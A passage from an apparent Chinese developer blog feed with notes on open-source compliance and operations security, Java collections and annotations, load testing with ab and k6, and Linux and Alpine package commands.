通用许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息基于该协议之上的项目需要采用相同的协议继续开源</td></tr></tbody></table><p>几乎所有的开源协议有一个共同的注意事项：<strong>采用该开源协议的软件项目，不提供任何责任转移和质量保证。</strong>也就是说采用开源软件造成的法律问题和开源项目无关，另外需要使用者承担因质量问题造成的所有后果。另外，除了引入的程序包之外，字体、图片、特效音、手册等媒体资源也算广义上的“软件”需要考虑开源协议和使用场景。</p><p><strong>第三方依赖管理</strong></p><p>从这次合规运动中印象最深刻的是对项目中出现的任何第三方依赖有效的管理，通过扫描工具，识别出项目中是否有源码、jar包、二进制文件是否来源于某个开源项目。</p><p>任何的第三方软件需要申请入库管理（内部其他团队申请通过可以直接使用），质量团队对申请的软件进行评估：</p><ol><li>是否有开源义务需要履行</li><li>引入的第三方依赖是否有 CVEs等漏洞</li><li>第三方开源软件是否仍然在维护</li></ol><p>质量团队根据上面的一些条件，决定出申请的软件能否在项目中使用，允许被采用的软件会定义出优选级别，优先推荐团队使用较为优选的软件，并对项目整体的优选率有一定要求。如果项目中出现了无法识别的二进制文件、非约定目录下的代码片段，需要报备。通过良好的依赖管理和规范化，能减少不良第三方依赖的引入，让软件项目透明、可信。</p><p>一些商业公司提供这些完整的服务，例如 fossid、blackduck、code-climate 等。</p><p><strong>运维安全</strong></p><p>大的软件公司，往往有一堆流程和要求，在合规运动期间，也经历了一些运维方面的改造。虽然一线开发对堡垒机、防火墙、各种安全规范显得不耐烦，但这些安全措施也在保护开发者。</p><p><strong>防火墙用于环境隔离</strong></p><p>往往开发者理解的防火墙用于防止网络入侵、审计、入侵检测等功能，除此之外，防火墙还可以用于各个环境的隔离。一般来说，企业对于生产环境的数据控制比较严格，不会将生产环境的权限交给团队所有开发者，但网络连接有可能疏漏。</p><p>曾经出现过一次线上事故，由于配置文件错误，将原本应该连接到测试的数据库连接到了生产环境，造成大量脏数据写入。如果通过防火墙规则对各个环境进行隔离，这类问题将不会出现。</p><p>另外也可以设计 DMZ 区，将面向用户侧的网关部署到 DMZ 区，仅仅开放必要的端口给网关，实现内外网的物理隔离。同时，对整个系统的防火墙策略应该清晰地记录，否则在做大的基础设施更新时，梳理出所有的防火墙策略，是一件比较困难的事情。</p><p><strong>凭据管理</strong></p><p>项目中会用到大量的凭据，例如数据库、第三方系统对接的 key，使用明文不是一件好事。理想的情况下，对项目中所有的密码信息进行掩盖(mask)，避免 CI、日志中敏感信息的泄露。</p><p>有很多种方法可以掩盖项目中的密码信息：</p><ol><li>使用环境变量对密码信息进行覆盖</li><li>使用Spring boot 的项目可以配置 jasypt，使用 jasypt 将密码加密，将生成的加密串配置 ENC(加密串) 到工程的配置文件中。加密过程可以加盐作为解密的凭据，“盐” 可以不存放到工程中，在工程部署的时候注入即可</li><li>如果使用 Jenkins 等 CI/CD 工具，可以使用构建平台提供的凭证管理工具</li><li>如果使用 Spring cloud，可以使用 spring cloud vault 组件部署一个凭证管理服务</li></ol><p>另外，建议不要用任何个人凭据用作系统对接，应该使用一个公共的应用凭据。</p><p><strong>堡垒机</strong></p><p>在合规运动的过程中，我们管理有数十台服务器，所有的运维操作需要通过堡垒机进行操作。而开放 22 等高危端口，允许开发者直接登录到服务器是一种不安全的做法。</p><p>堡垒机，通俗的来说是跳板机 + 监控。行业最初使用的跳板机配置了两张网卡，用于连接开发环境和生产环境，并没有监控功能。在此基础上，堡垒机增加了统一运维管理的功能，往往需要两步验证（SMS 或 Email），并对所有的操作进行记录和监控。</p><p>在需要团队参与运维工作的场景中，非常有必要部署一套堡垒机服务，并使用 LDAP 对接到团队成员的 ID 上，便于集中运维管理。</p><p><strong>定期对系统软件扫描</strong></p><p>Linux 系统往往有云厂商推送安全补丁和风险提示，但是安装到服务器上的软件，例如 JDK、nodejs，需要自己检查安全问题。因此需要在系统中安装并定期运行 CVEs 检查并及时更新。有一款 cvechecker 可以帮助运维人员，编写一个脚本定期运行 cvechecker  检查系统中已知的软件是否存在 CVEs 漏洞，并提醒开发者及时更新。</p><p><strong>写在后面</strong></p><p>刚开始工作时候，喜欢动态的、灵活的编程语言，讨厌的死板的、套路化的编程语言，然而需要很长一段时间，才能意识到 “约束是程序员的朋友”。对一些安全知识了解的来源大多来自修复 SonarQube 的经历，使用 findbugs 也让我对 Java 基础认识的更加深刻。</p><p>类似的，在使用一些框架、平台的时候往往存在大量的限制，有时候开发者难以意识到 “限制” 正是框架、平台的作者 “保护” 应用开发者的一种方式。有一些开发者以 Hack 框架、平台为乐，但是这样会带来潜在的隐患，在用户量上来之后负面效应表现的尤为明显。</p><p>项目的规范化对于 Tech Lead来说可以减少程序的运行事故和 codereview 时间，对于团队来说也许可以少加班吧。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Spring boot API 文档方案</title>
      <link href="/Spring/spring/spring-rest-doc/"/>
      <url>/Spring/spring/spring-rest-doc/</url>
      
        <content type="html"><![CDATA[<h2 id="Swagger-restdocs-方案"><a href="#Swagger-restdocs-方案" class="headerlink" title="Swagger + restdocs 方案"></a>Swagger + restdocs 方案</h2><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>restdocs 方案<a href="https://www.jianshu.com/p/d2e19861f1b2" target="_blank" rel="noopener">https://www.jianshu.com/p/d2e19861f1b2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码质量扫描</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/codescan/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/codescan/</url>
      
        <content type="html"><![CDATA[<h2 id="开源扫描"><a href="#开源扫描" class="headerlink" title="开源扫描"></a>开源扫描</h2><ul><li>foosid</li></ul><h2 id="代码质量扫描"><a href="#代码质量扫描" class="headerlink" title="代码质量扫描"></a>代码质量扫描</h2><p>### </p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 集合</title>
      <link href="/java/java/java-collections/"/>
      <url>/java/java/java-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>java 中队列分为单项队列和双向队列</p><ul><li>单项队列 Queue 接口<ul><li>队列通常 FIFO （先进先出）</li><li>优先级队列和堆栈 LIFO （后进先出）</li></ul></li><li>双向队列 Deque (Double ended queue)<ul><li>是一种具有队列和栈性质的数据结构</li><li>可以两头操作</li></ul></li></ul><p>ArrayDeque 是通过数组实现的双向队列。ArrayDeque不是线程安全的。<br>ArrayDeque不可以存取null元素，因为系统根据某个位置是否为null来判断元素的存在。 当作为栈使用时，性能比Stack好；当作为队列使用时，性能比LinkedList好。 </p><p>常用的方法有:</p><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><ul><li>addFirst(E e)在数组前面添加元素</li><li>addLast(E e)在数组后面添加元素</li><li>offerFirst(E e) 在数组前面添加元素，并返回是否添加成功</li><li>offerLast(E e) 在数组后天添加元素，并返回是否添加成功</li></ul><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>removeFirst()删除第一个元素，并返回删除元素的值,如果元素为null，将抛出异常<br>pollFirst()删除第一个元素，并返回删除元素的值，如果元素为null，将返回null<br>removeLast()删除最后一个元素，并返回删除元素的值，如果为null，将抛出异常<br>pollLast()删除最后一个元素，并返回删除元素的值，如果为null，将返回null<br>removeFirstOccurrence(Object o) 删除第一次出现的指定元素<br>removeLastOccurrence(Object o) 删除最后一次出现的指定元素</p><h3 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h3><ul><li>getFirst() 获取第一个元素,如果没有将抛出异常</li><li>getLast() 获取最后一个元素，如果没有将抛出异常</li></ul><h3 id="队列操作"><a href="#队列操作" class="headerlink" title="队列操作"></a>队列操作</h3><ul><li>add(E e) 在队列尾部添加一个元素</li><li>offer(E e) 在队列尾部添加一个元素，并返回是否成功</li><li>remove() 删除队列中第一个元素，并返回该元素的值，如果元素为null，将抛出异常(其实底层调用的是removeFirst())</li><li>poll()  删除队列中第一个元素，并返回该元素的值,如果元素为null，将返回null(其实调用的是pollFirst())</li><li>element() 获取第一个元素，如果没有将抛出异常</li><li>peek() 获取第一个元素，如果返回null</li></ul><h3 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h3><ul><li>push(E e) 栈顶添加一个元素</li><li>pop(E e) 移除栈顶元素,如果栈顶没有元素将抛出异常</li></ul><h3 id="通用操作"><a href="#通用操作" class="headerlink" title="通用操作"></a>通用操作</h3><ul><li>size() 获取队列中元素个数</li><li>isEmpty() 判断队列是否为空</li><li>iterator() 迭代器，从前向后迭代</li><li>descendingIterator() 迭代器，从后向前迭代</li><li>contain(Object o) 判断队列中是否存在该元素</li><li>toArray() 转成数组</li><li>clear() 清空队列</li><li>clone() 克隆(复制)一个新的队列</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>ArrayDeque类的使用详解 <a href="https://blog.csdn.net/skh2015java/article/details/74840513" target="_blank" rel="noopener">https://blog.csdn.net/skh2015java/article/details/74840513</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 注解基础</title>
      <link href="/java/java/java-annotation/"/>
      <url>/java/java/java-annotation/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>注解是插到源代码中的标签，使用其他工具可以对其进行处理。例如  RequestMapping 这个注解的定义。Spring MVC 会使用 AOP 等机制在启动时对 RequestMapping 进行处理，添加到 RequestMap 列表中，响应用户请求。</p><pre><code>@Target({ElementType.METHOD, ElementType.TYPE})@Retention(RetentionPolicy.RUNTIME)@Documented@Mappingpublic @interface RequestMapping {}</code></pre><p>Java 提供了一些元注解，用于修饰自定义的注解。</p><ul><li>@Target 限制注解使用的位置</li><li>@Retention 注解保留的时间，RetentionPolicy.RUNTIME 会保留到运行时</li><li>@Document 生成的文档是否包含这个注解</li><li>@Inherited 使用在类上，是否运行子类继承这个注解</li></ul><p>另外注解上还可以使用其他注解，从而实现复合注解。复合注解是 Spring 提供的注解增强能力。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web网站的几个并发量级</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/qps-level/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/qps-level/</url>
      
        <content type="html"><![CDATA[<p>50QPS以下——小网站</p><p>没什么好说的，简单的小网站而已，就如同本站这样，你可以用最简单的方法快速搭建，短期没有太多的技术瓶颈，只要服务器不要太烂就好。</p><p>50～100QPS——DB极限型</p><p>大部分的关系型数据库的每次请求大多都能控制在0.01秒左右，即便你的网站每页面只有一次DB请求，那么页面请求无法保证在1秒钟内完成100个请求，这个阶段要考虑做Cache或者多DB负载。无论那种方案，网站重构是不可避免的。</p><p>300～800QPS——带宽极限型</p><p>目前服务器大多用了IDC提供的“百兆带宽”，这意味着网站出口的实际带宽是8M Byte左右。假定每个页面只有10K Byte，在这个并发条件下，百兆带宽已经吃完。首要考虑是CDN加速／异地缓存，多机负载等技术。</p><p>500～1000QPS——内网带宽极限＋Memcache极限型</p><p>由于Key/value的特性，每个页面对memcache的请求远大于直接对DB的请求，Memcache的悲观并发数在2w左右，看似很高，但事实上大多数情况下，首先是有可能在次之前内网的带宽就已经吃光，接着是在8K QPS左右的情况下，Memcache已经表现出了不稳定，如果代码上没有足够的优化，可能直接将压力转嫁到了DB层上，这就最终导致整个系统在达到某个阀值之上，性能迅速下滑。</p><p>1000～2000QPS——FORK/SELECT，锁模式极限型</p><p>好吧，一句话：线程模型决定吞吐量。不管你系统中最常见的锁是什么锁，这个级别下，文件系统访问锁都成为了灾难。这就要求系统中不能存在中央节点，所有的数据都必须分布存储，数据需要分布处理。总之，关键词：分布</p><p>2000QPS以上——C10K极限</p><p>尽管现在很多应用已经实现了C25K，但短板理论告诉我们，决定网站整体并发的永远是最低效的那个环节。我承认我生涯中从未遇到过2000QPS以上，甚至1.5K以上的网站，希望有此经验的哥们可以一起交流下</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>Web网站的几个并发量级 <a href="https://www.cnblogs.com/yiwd/p/3711677.html" target="_blank" rel="noopener">https://www.cnblogs.com/yiwd/p/3711677.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 ab(apache benchmark) 进行压力测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/apache-benchmark/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/apache-benchmark/</url>
      
        <content type="html"><![CDATA[<p>Apache Benchmark 简称 ab 是 Apache web 服务器自带的性能测试工具，在 windows 或者 linux 上安装了 Apache 服务器就可以在其安装位置的 bin 目录中找到 ab 这个程序。</p><p>ab 使用起来非常简单，一般只需要 -n 参数指明发出请求的总数，以及 -c 参数指明测试期间的并发数。</p><p>例如对 thoughtworks 官网首页发出 100 个请求，模拟并发数为 10：</p><blockquote><p>ab -n 100 -c 10 <a href="https://thoughtworks.com/" target="_blank" rel="noopener">https://thoughtworks.com/</a></p></blockquote><p>需要注意的是 ab 工具接收一个 url 作为参数，仅仅是一个域名是不合法的，需要增加 <code>/</code> 表示首页。稍等片刻后就可以看到测试报告:</p><pre><code>Server Software:        nginx/1.15.6Server Hostname:        thoughtworks.comServer Port:            443SSL/TLS Protocol:       TLSv1.2,ECDHE-RSA-AES256-GCM-SHA384,2048,256Server Temp Key:        ECDH P-256 256 bitsTLS Server Name:        thoughtworks.comDocument Path:          /Document Length:        162 bytesConcurrency Level:      10Time taken for tests:   42.079 secondsComplete requests:      100Failed requests:        0Non-2xx responses:      100Total transferred:      42500 bytesHTML transferred:       16200 bytesRequests per second:    2.38 [#/sec] (mean)Time per request:       4207.888 [ms] (mean)Time per request:       420.789 [ms] (mean, across all concurrent requests)Transfer rate:          0.99 [Kbytes/sec] receivedConnection Times (ms)              min  mean[+/-sd] median   maxConnect:     1056 2474 3006.1   1144   23032Processing:   349  740 1003.5    379    8461Waiting:      349  461 290.9    377    2265Total:       1411 3214 3273.9   1674   23424Percentage of the requests served within a certain time (ms)  50%   1674  66%   2954  75%   3951  80%   4397  90%   6713  95%   9400  98%  14973  99%  23424 100%  23424 (longest request)</code></pre><p>从这个报告中可以看到服务器的一些基本信息，以及请求的统计信息。比较重要的指标是 <code>Requests per second</code> 每秒钟完成的请求数量，不严格的说也就是我们的平时说的 QPS。</p><p>ab 测试是专为 http 请求设计的，因此 ab 的其他参数和 curl 的参数比较类似，也可以指定 http method 以及 cookies 等参数。</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 k6 进行压力测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/performace-testing-k6/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/performace-testing-k6/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p><ul><li>提供了友好的 CLI  工具</li><li>使用 JavaScript 代码编写测试用例</li><li>可以根据性能条件设置阈值，表明成功还是失败</li></ul><p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p><p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在 Mac 上比较简单，直接使用 HomeBrew 即可安装：</p><blockquote><p>brew install k6</p></blockquote><p>其他平台官网也提供了相应的安装方式，比较特别的是提供了 Docker 的方式运行。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>直接使用 k6 的命令运行测试，官网提供了一个例子：</p><blockquote><p>k6 run github.com/loadimpact/k6/samples/http_get.js</p></blockquote><p>也可以编写自己的测试脚本:</p><pre><code>import http from &quot;k6/http&quot;;import { sleep } from &quot;k6&quot;;export default function() {  http.get(&quot;https://www.thoughtworks.com&quot;);  sleep(1);};</code></pre><p>保存文件 script.js 后运行 k6 命令</p><blockquote><p>k6 run script.js</p></blockquote><p>然后可以看到 http 请求的各项指标</p><pre><code>        /\      |‾‾|  /‾‾/  /‾/        /\  /  \     |  |_/  /  / /        /  \/    \    |      |  /  ‾‾\     /          \   |  |‾\  \ | (_) |   / __________ \  |__|  \__\ \___/ .io  execution: local     output: -     script: k6.js    duration: -,  iterations: 1         vus: 1, max: 1    done [==========================================================] 1 / 1    data_received..............: 108 kB 27 kB/s    data_sent..................: 1.0 kB 252 B/s    http_req_blocked...........: avg=2.35s    min=2.35s    med=2.35s    max=2.35s    p(90)=2.35s    p(95)=2.35s       http_req_connecting........: avg=79.18ms  min=79.18ms  med=79.18ms  max=79.18ms  p(90)=79.18ms  p(95)=79.18ms     http_req_duration..........: avg=639.03ms min=639.03ms med=639.03ms max=639.03ms p(90)=639.03ms p(95)=639.03ms    http_req_receiving.........: avg=358.12ms min=358.12ms med=358.12ms max=358.12ms p(90)=358.12ms p(95)=358.12ms    http_req_sending...........: avg=1.79ms   min=1.79ms   med=1.79ms   max=1.79ms   p(90)=1.79ms   p(95)=1.79ms      http_req_tls_handshaking...: avg=701.46ms min=701.46ms med=701.46ms max=701.46ms p(90)=701.46ms p(95)=701.46ms    http_req_waiting...........: avg=279.12ms min=279.12ms med=279.12ms max=279.12ms p(90)=279.12ms p(95)=279.12ms    http_reqs..................: 1      0.249921/s    iteration_duration.........: avg=4s       min=4s       med=4s       max=4s       p(90)=4s       p(95)=4s          iterations.................: 1      0.249921/s    vus........................: 1      min=1 max=1    vus_max....................: 1      min=1 max=1</code></pre><p>运行压力测试时，需要增加更多的虚拟用户（VU），vus 参数和持续时间的参数:</p><blockquote><p>k6 run –vus 10 –duration 30s script.js</p></blockquote><h2 id="编写测试脚本的一些规则"><a href="#编写测试脚本的一些规则" class="headerlink" title="编写测试脚本的一些规则"></a>编写测试脚本的一些规则</h2><p><code>default</code> 方法是用于给每个 VU 以及每次迭代重复运行的，因此需要把真正的测试代码放到这个方法中，例如访问某个页面。</p><p>为了保证测试的准确性，一些初始化的代码不应该放到 <code>default</code> 方法中。尤其是文件的读取等依赖环境上下文的操作不能放到 <code>default</code> 方法中执行，这样做也会丢失 k6 分布式运行的能力。</p><p>前面提到的命令行参数，例如指定虚拟用户数量 <code>--vus 10</code>，这些参数也可以放到脚本代码中。通过暴露一个 options 对象即可。</p><pre><code>export let options = {  vus: 10,  duration: &quot;30s&quot;};</code></pre><p>为了更为真实的模拟用户访问的场景，k6 提供了在整个测试期间让用户数量和访问时间呈阶段性变化的能力。只需要在 options 中增加 stages 参数即可：</p><pre><code>export let options = { stages: [    { duration: &quot;30s&quot;, target: 20 },    { duration: &quot;1m30s&quot;, target: 10  },    { duration: &quot;20s&quot;, target: 0 },  ]};</code></pre><p>在测试过程中需要检查网络请求是否成功，返回的状态码是否正确，以及响应时间是否符合某个阈值。在脚本中可以通过调用 check() 方法编写检查语句，以便 k6 能收集到报告。</p><pre><code>import http from &quot;k6/http&quot;;import { check, sleep } from &quot;k6&quot;;export let options = {  vus: 10,  duration: &quot;30s&quot;};export default function() {  let res = http.get(&quot;http://test.loadimpact.com&quot;);  check(res, {    &quot;status was 200&quot;: (r) =&gt; r.status == 200,    &quot;transaction time OK&quot;: (r) =&gt; r.timings.duration &lt; 200  });  sleep(1);};</code></pre><h2 id="报告输出"><a href="#报告输出" class="headerlink" title="报告输出"></a>报告输出</h2><p>k6 默认将报告输出到 stdout 控制台，同时也提供了多种格式报告输出，包括：</p><ul><li>JSON</li><li>CSV</li><li>InfluxDB</li><li>Apache Kafka</li><li>StatsD</li><li>Datadog</li><li>Load Impact cloud platform</li></ul><p>当然，我们在编写测试的时候不可能只有一个用例，对多个场景可以在脚本中通过 <code>group</code> 进行分组，分组后输出的报告会按照分组排列。同时，也可以使用对一个组整体性能衡量的指标 <code>group_duration</code>。</p><pre><code>import { group } from &quot;k6&quot;;export default function() {  group(&quot;user flow: returning user&quot;, function() {    group(&quot;visit homepage&quot;, function() {      // load homepage resources    });    group(&quot;login&quot;, function() {      // perform login    });  });};</code></pre><p>InfluxDB 等外部数据收集平台时，还可以打上标签，供过滤和检索使用。k6 提供了一些内置的标签，并允许用户自定义标签。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>官方文档 <a href="https://docs.k6.io/docs" target="_blank" rel="noopener">https://docs.k6.io/docs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 下字体安装</title>
      <link href="/linux/linux/linux-font/"/>
      <url>/linux/linux/linux-font/</url>
      
        <content type="html"><![CDATA[<p>linux 下字体安装可以通过软件包的方式安装，例如 </p><blockquote><p>yum fonts-wqy-zenhei</p></blockquote><p>另外可以使用 ttf 和 ttc 字体文件安装</p><p>安装 fontconfig 管理字体，然后将 ttf 和 ttc 文件拷贝到 /usr/share/fonts 目录下，最后更新字体缓存即可。</p><h2 id="字体安装相关命令"><a href="#字体安装相关命令" class="headerlink" title="字体安装相关命令"></a>字体安装相关命令</h2><p>安装 fontconfig</p><blockquote><p>yum install -y fontconfig mkfontscale</p></blockquote><p>查看已经安装的字体</p><blockquote><p>fc-list</p></blockquote><p>查看中文字体</p><blockquote><p>fc-list :lang=zh</p></blockquote><p>拷贝字体 </p><blockquote><p>mv simsun.ttf /usr/share/fonts</p></blockquote><p>执行安装字体，并更新缓存 </p><blockquote><p>mkfontscale &amp;&amp; mkfontdir &amp;&amp; fc-cache</p></blockquote><p>使用 fc-list :lang=zh 可以验证</p><p>如果过程中安装不顺利，可能需要赋权</p><blockquote><p>chmod a+r simsun.ttc</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>linux安装中文字体 <a href="https://jingyan.baidu.com/article/0eb457e5d4a48703f0a90565.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/0eb457e5d4a48703f0a90565.html</a></li><li>docker alpine版本服务中显示中文 <a href="https://www.wencst.com/archives/711" target="_blank" rel="noopener">https://www.wencst.com/archives/711</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker Alpine 使用科大源</title>
      <link href="/docker/docker/docker-change-alpine-repo/"/>
      <url>/docker/docker/docker-change-alpine-repo/</url>
      
        <content type="html"><![CDATA[<h2 id="使用科大源-http-mirrors-ustc-edu-cn"><a href="#使用科大源-http-mirrors-ustc-edu-cn" class="headerlink" title="使用科大源  http://mirrors.ustc.edu.cn"></a>使用科大源  <a href="http://mirrors.ustc.edu.cn" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn</a></h2><blockquote><p>sed -i ‘s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g’ /etc/apk/repositories</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Alpine apk 命令</title>
      <link href="/docker/docker/docker-alpine/"/>
      <url>/docker/docker/docker-alpine/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-Alpine"><a href="#关于-Alpine" class="headerlink" title="关于 Alpine"></a>关于 Alpine</h2><p>Alpine Linux是一个面向安全应用的轻量级Linux发行版。它采用了musl libc和busybox以减小系统的体积和运行时资源消耗，同时还提供了自己的包管理工具apk。</p><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><p>alpine 提供了非常好用的apk软件包管理工具</p><h3 id="apk-update"><a href="#apk-update" class="headerlink" title="apk update"></a>apk update</h3><p>update：从远程镜像源中更新本地镜像源索引。</p><p>update命令会从各个镜像源列表下载APKINDEX.tar.gz并存储到本地缓存，一般在/var/cache/apk/(Alpine在该目录下)、/var/lib/apk/ 、/etc/apk/cache/下。</p><h3 id="apk-add"><a href="#apk-add" class="headerlink" title="apk add"></a>apk add</h3><p>add：安装PACKAGES并自动解决依赖关系。</p><p>add命令从仓库中安装最新软件包，并自动安装必须的依赖包，也可以从第三方仓库添加软件包。</p><pre><code>$ apk add openssh openntp vim$ apk add --no-cache mysql-client$ apk add docker --update-cache --repository http://mirrors.ustc.edu.cn/alpine/v3.4/main/ --allow-untrusted</code></pre><p>安装指定版本软件包</p><pre><code>apk add asterisk=1.6.0.21-r0$ apk add &#39;asterisk&lt;1.6.1&#39;$ apk add &#39;asterisk&gt;1.6.1</code></pre><h3 id="apk-del"><a href="#apk-del" class="headerlink" title="apk del"></a>apk del</h3><p>del：卸载并删除PACKAGES</p><blockquote><p>apk del openssh openntp vim</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 dpkg 安装 deb包</title>
      <link href="/linux/linux/linux-dpkg/"/>
      <url>/linux/linux/linux-dpkg/</url>
      
        <content type="html"><![CDATA[<h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><blockquote><p>dpkg -i 安装包</p></blockquote><p>借助 apt-get 解决依赖</p><blockquote><p>apt-get update &amp;&amp; apt-get -f install </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux yum</title>
      <link href="/linux/linux/linux-yum/"/>
      <url>/linux/linux/linux-yum/</url>
      
        <content type="html"><![CDATA[<h2 id="常见的-yum-使用"><a href="#常见的-yum-使用" class="headerlink" title="常见的 yum 使用"></a>常见的 yum 使用</h2><ol><li>添加源</li></ol><p>例如 docker ce</p><blockquote><p>wget <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a><br>mv docker-ce.repo /ect/yum.repo.d/</p></blockquote><ol start="2"><li>显示软件的可选版本 </li></ol><p>例如显示出 docker 的各个版本</p><blockquote><p>yum list docker-ce –showduplicates | sort -r</p></blockquote><pre><code>```</code></pre><p>docker-ce.aarch64            3:19.03.5-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.4-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.3-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.2-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.1-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.0-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.9-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.8-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.7-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.6-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.5-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.4-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.3-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.2-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.1-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.0-3.el7                    docker-ce-stable<br>docker-ce.aarch64            18.06.3.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.2.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.1.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.0.ce-3.el7.centos            docker-ce-stable<br>docker-ce.aarch64            18.03.1.ce-1.el7.centos            docker-ce-stable<br>docker-ce.aarch64            18.03.0.ce-1.el7.centos            docker-ce-stable<br>    <code>`</code></p><p>第二列中，冒号到第一个中横线才是版本号，安装指定版本： </p><blockquote><p>sudo yum install docker-ce-docker-ce-18.09.1 docker-ce-cli-docker-ce-18.09.1 containerd.io</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>AArch64 是什么</title>
      <link href="/ARM/arm/arm-64/"/>
      <url>/ARM/arm/arm-64/</url>
      
